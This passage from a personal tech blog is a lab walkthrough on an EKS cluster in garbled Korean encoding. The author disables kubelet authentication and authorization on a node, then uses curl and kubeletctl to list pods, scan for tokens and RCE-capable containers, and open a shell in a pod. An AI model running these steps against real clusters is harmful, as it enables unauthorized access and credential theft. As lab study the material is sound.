</span></span><span style="display:flex;"><span>rm -rf ~/.kube
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë‹¤ìš´ë¡œë“œ</span>
</span></span><span style="display:flex;"><span>curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> chmod a+x ./kubeletctl_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
</span></span><span style="display:flex;"><span>kubeletctl version
</span></span><span style="display:flex;"><span>kubeletctl help
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œ1 IP ë³€ìˆ˜ ì§€ì •</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># my-eks-bastionì— ì €ì¥í–ˆë˜ $N1 í™•ì¸í•˜ì—¬ ë³€ìˆ˜ ì§€ì •</span>
</span></span><span style="display:flex;"><span>N1<span style="color:#f92672">=</span>192.168.1.151
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œ1 IPë¡œ Scan</span>
</span></span><span style="display:flex;"><span>kubeletctl scan --cidr $N1/32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œ1ì— kubelet API í˜¸ì¶œ ì‹œë„: Unauthorized</span>
</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/pods; echo
</span></span></code></pre></div><ul>
<li>[myeks-bastion] â†’ ë…¸ë“œ1 ì ‘ì† : kubelet-config.json ìˆ˜ì •
<ul>
<li>authentication.anonymous.enabled: false -&gt; <strong>true</strong></li>
<li>authorization.mode: &ldquo;Webhook&rdquo; -&gt; <strong>&ldquo;AlwaysAllow&rdquo;</strong></li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œ1 ì ‘ì†</span>
</span></span><span style="display:flex;"><span>ssh ec2-user@$N1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë¯¸í¡í•œ ì¸ì¦/ì¸ê°€ ì„¤ì •ìœ¼ë¡œ ë³€ê²½: ìœ„ì˜ json ìˆ˜ì •ë‚´ìš© ì°¸ì¡°</span>
</span></span><span style="display:flex;"><span>vi /etc/kubernetes/kubelet/kubelet-config.json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet restart</span>
</span></span><span style="display:flex;"><span>systemctl restart kubelet
</span></span><span style="display:flex;"><span>systemctl status kubelet
</span></span></code></pre></div><p><img src="images/edit-kubelet-config-with-vulnerability.png" alt="edit kubelet-config with vulnerability"></p>
<ul>
<li>[myeks-bastion-2] kubelet ì‚¬ìš©</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ëª©ë¡ í™•ì¸</span>
</span></span><span style="display:flex;"><span>curl -s -k https://$N1:10250/pods | jq
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet-config.json ì„¤ì • ë‚´ìš© í™•ì¸</span>
</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/configz | jq
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeletct ì‚¬ìš©</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Return kubelet&#39;s configuration</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 configz | jq
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get list of pods on the node</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 pods 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scans for nodes with opened kubelet API &gt; Scans for for all the tokens in a given Node</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 scan token
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet APIë¡œ ëª…ë ¹ ì‹¤í–‰ : &lt;ë„¤ì„ìŠ¤í˜ì´ìŠ¤&gt; / &lt;íŒŒë“œëª…&gt; / &lt;ì»¨í…Œì´ë„ˆëª…&gt;</span>
</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/run/default/myawscli/my-aws-cli -d <span style="color:#e6db74">&#34;cmd=aws --version&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># remote code executionì´ ê°€ëŠ¥í•œ containers ì¡°íšŒ</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 scan rce
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run commands inside a container</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span> -n default -p myawscli -c my-aws-cli
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë‚´ë¶€ ì‰˜ì—ì„œ ì•„ë˜ ì‹¤í–‰</span>
</span></span><span style="display:flex;"><span>export
</span></span><span style="display:flex;"><span>aws --version
</span></span><span style="display:flex;"><span>aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
</span></span><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Return resource usage metrics (such as container CPU, memory usage, etc.)</span>
</span></span><span style="display:flex;"><span>kubeletctl -s $N1 metrics
</span></span></code></pre></div><p><img src="images/vulnerable-pods-to-rce.png" alt="vulnerable pods to RCE"></p>
<h2 id="6-ì‹¤ìŠµ-ëª»í•´ë³¸-ê²ƒ">6. ì‹¤ìŠµ ëª»í•´ë³¸ ê²ƒ</h2>
<ul>
<li>íŒŒë“œ/ì»¨í…Œì´ë„ˆ ë³´ì•ˆ ì»¨í…ìŠ¤íŠ¸
<ul>
<li>LB Controller IRSA ë•ë¶„ì—, ë‚˜ì¤‘ì— ì‹¤ìŠµí•´ì•¼ í•¨ (To-Do)</li>
</ul>
</li>
</ul>

  </div>
  </section>
  <section class="p-strip">
    <div class="row">
      <script src="https://giscus.app/client.js"
        data-repo="kkumtree/blog.minseong.xyz"
        data-repo-id="R_kgDOIv-sqA"
        data-category="Blog Comments"
        data-category-id="DIC_kwDOIv-sqM4CW7uO"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="ko"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
      </script>
    </div>
  </section>
  <div class="card w-full bg-base-100 shadow-xl">
  <div class="card-body" id="adbody">
      <script async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1254864146899485"
          crossorigin="anonymous"></script>
      
      <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1254864146899485"
          data-ad-slot="3556422150" data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
  </div>
  
  <script>
      let adsection = document.getElementsByClassName("adsbygoogle")[0];
      let adfallback = document.getElementById("adfallback");
      adfallback.style.display = "none";
      if (window.getComputedStyle(adsection).display == "none") {
          document.getElementById("adbody").style.display = "none";
          adfallback.style.display = "block";
      } 
  </script>
</div>
  <section class="p-strip--light">
    <div class="row">
      
      <div class="col-12">
        <div class="p-media-object">
          <img src="https://avatars.githubusercontent.com/u/52643858?v=4" class="p-media-object__image is-round" alt="">
          <div class="p-media-object__details">
            <h3 class="p-media-object__title">
              <a href="#">kkumtree</a>
            </h3>
            <p class="p-media-object__content">plumber for infra</p>
            <ul class="p-inline-list--middot">
              <li class="p-inline-list__item"><a href="mailto:mscho7969@ubuntu.com">Email</a></li>
              <li class="p-inline-list__item"><a href="https://launchpad.net/~mscho7969">Launchpad</a></li>
              <li class="p-inline-list__item"><a href="https://github.com/kkumtree">GitHub</a></li>
            </ul>
          </div>
        </div>
         
    </div>
  </section>
  <section class="p-strip">
    <div class="row">
      <footer class="p-article-pagination">
        
        <a class="p-article-pagination__link--previous" href="/post/how-to-backup-gpg-key-to-personal-media/">
          <span class="p-article-pagination__label">Previous</span>
          <span class="p-article-pagination__title">GnuPG í‚¤ ë°±ì—…í•˜ê¸°</span>
        </a>
        
        
        <a class="p-article-pagination__link--next" href="/post/how-to-add-comment-section-in-gh-pages/">
          <span class="p-article-pagination__label">Next</span>
          <span class="p-article-pagination__title">gh-pagesì— ëŒ“ê¸€ ê¸°ëŠ¥ ì¶”ê°€í•˜ê¸°(giscus/Hugo)</span>
        </a>
        
      </footer>
    </div>
  </section>
</main>

        </div><section class="p-strip--accent">
  <div class="row">
    <div class="col-12">
      <h2>kkumtree</h2>
      <ul class="p-inline-list--middot is-dark">
        <li class="p-inline-list__item">
          <a href="mailto:mscho7969@ubuntu.com">Contact with (Email)</a>
        </li>
        
        
        
        <li class="p-inline-list__item">
          <a href="https://github.com/kkumtree">GitHub</a>
        </li>
        <li class="p-inline-list__item">
          <a href="https://launchpad.net/~mscho7969">Launchpad</a>
        </li>
      </ul>
      <p>
        Â© 2024 kkumtree and contributors All rights reserved.<br>
        Licensed under 
        <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" style="display:inline-block;">
          CC BY-NC-ND 4.0
          <img style="" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg">
          <img style="" src="https://mirrors.creativecommons.org/presskit/icons/by.svg">
          <img style="" src="https://mirrors.creativecommons.org/presskit/icons/nc.svg">
          <img style="" src="https://mirrors.creativecommons.org/presskit/icons/nd.svg">
        </a>
      </p>
      <a href="https://github.com/kkumtree/blog.minseong.xyz">Source code on GitHub</a>
    </div>
  </div><script type="text/javascript" src='/js/v-framework.js'></script>
<script type="text/javascript" src='/js/timedisplay.js'></script>
<script>

let slides = document.getElementsByClassName("main-slide");
let index = 0;
let count = slides.length;
function setSlideIndex(destination) {
    index = destination % count;
    index = index < 0 ? index * -1 : index;
    for (let i = 0; i < count; i++) {
        if(i == index) {
            slides[i].style.display = "block";
        } else {
            slides[i].style.display = "none";
        }
    }
}
function nextSlide() {
    setSlideIndex(index + 1);
}
function prevSlide() {
    setSlideIndex(index - 1);
}
setSlideIndex(0);
setInterval(nextSlide, 5000);
</script>

</body>
</html>
